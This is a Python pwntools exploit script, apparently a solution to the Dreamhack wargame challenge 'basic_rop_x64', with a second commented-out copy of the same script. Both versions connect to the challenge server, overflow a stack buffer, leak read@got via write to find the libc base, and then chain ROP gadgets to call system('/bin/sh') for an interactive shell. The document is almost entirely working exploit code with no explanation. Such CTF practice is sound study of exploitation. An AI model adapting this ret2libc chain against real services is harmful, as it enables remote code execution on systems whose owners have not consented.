from pwn import *
#p = process('./basic_rop_x64')
p = remote('host3.dreamhack.games', 17769)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')
r = ROP(e)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

main = e.symbols['main']

system_offset = libc.symbols['system']
read_offset = libc.symbols['read']

sh_offset = list(libc.search(b"/bin/sh"))[0]

payload = b'a'*0x40 + b'b' * 0x8
#write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(read_got) + p64(8)
payload += p64(write_plt)
#return to main
payload += p64(main)

p.send(payload)
p.recvuntil(b'a'*0x40)
r_read = u64(p.recvn(6) + b'\x00' *2)
lb = r_read - read_offset
system = lb + system_offset
binsh = sh_offset + lb

payload = b'a' * 0x40 + b'b' * 0x8

#read(0, read_got, ...)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)

p.interactive()


'''
from pwn import *

def slog(symbol, addr):
    return success(symbol + ": " + hex(addr))

#context.log_level = 'debug'

p = remote('host3.dreamhack.games', 10263)
#p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
#libc = e.libc
libc = ELF("./libc.so.6", checksec=False)
r = ROP(e)

read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# Stage 1
payload:bytes = b'A' * 0x48

# write(1, read@got, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset
binsh = sh + lb

slog("read", read)
slog("libc base", lb)
slog("system", system)
slog("/bin/sh", binsh)

# Stage 2
payload: bytes = b'A' * 0x48

# system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
'''